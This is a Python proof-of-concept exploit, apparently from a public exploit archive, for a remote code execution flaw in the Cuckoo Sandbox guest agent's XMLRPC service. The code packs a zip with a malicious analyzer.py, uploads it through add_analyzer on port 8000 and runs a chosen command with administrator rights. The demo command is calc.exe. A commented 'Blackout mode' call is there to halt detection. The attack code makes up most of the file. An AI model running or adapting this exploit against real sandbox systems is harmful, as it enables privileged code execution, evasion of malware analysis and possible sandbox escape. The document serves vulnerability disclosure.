# -*- coding: utf8 -*-
"""
# Exploit Title: Cuckoo Sandbox Guest XMLRPC Privileged RCE PoC
# Date: June 28th 2016
# Exploit Author: Rémi ROCHER
# Vendor Homepage: https://cuckoosandbox.org/
# Software Link: https://github.com/cuckoosandbox/cuckoo/archive/master.zip
# Version: <= 2.0.1
# Tested on: MS Windows 7, MS Windows 10 (With & without UAC)
# CVE : None

--[ NAME

Cuckoo Sandbox Guest XMLRPC Privileged RCE PoC

--[ DESCRIPTION

Cuckoo Sandbox is Free Software, basically used by researchers to analyze
(potential) malware behavior. It is also implemented industrially by
private companies for detecting potential threats within IT Networks
featuring dedicated so-called security appliances.

This basic Proof of Concept exploit is spawning  a calc.exe process with
Administrator privileges, assuming:
    * The Cuckoo agent.py is running with Admin privileges (should be
the case)
    * The current user can access a local interface (should be the case)
    * Optional for true Remote Code Execution: External equipment can
    access the XMLRPC port (default 8000).

One may also call the complete() method in order to stop any further
detection
or screenshot.

Such vulnerabilities can be used to either trick the very detection
system, or
potentially escape the sandbox machine itself. An attacker could also
exploit
such bugs as a pivot in order to attack sensitive systems.

--[ AUTHORS

* Rémi ROCHER - Armature Technologies
* Thomas MARTHÉLY- Armature Technologies

--[ RESOURCE
* Repository: https://github.com/cuckoosandbox/cuckoo


"""
import xmlrpclib
from StringIO import StringIO
from zipfile import ZipFile, ZipInfo, ZIP_STORED, ZIP_DEFLATED


def execute(x, cmd="cmd /c start"):
    output = StringIO()
    file = ZipFile(output, "w", ZIP_STORED)
    info = ZipInfo("analyzer.py")
    info.compress_type = ZIP_DEFLATED

    content = ("""
import subprocess

if __name__ == "__main__":
  subprocess.Popen("%s",stdout=subprocess.PIPE,stderr=subprocess.PIPE)

""" % cmd)
    file.writestr(info, content)
    file.close()

    data = xmlrpclib.Binary(output.getvalue())

    if x.add_analyzer(data):
        return x.execute()


if __name__ == "__main__":
    x = xmlrpclib.ServerProxy("http://localhost:8000")
    execute(x, "calc.exe")
    # x.complete() #  Blackout mode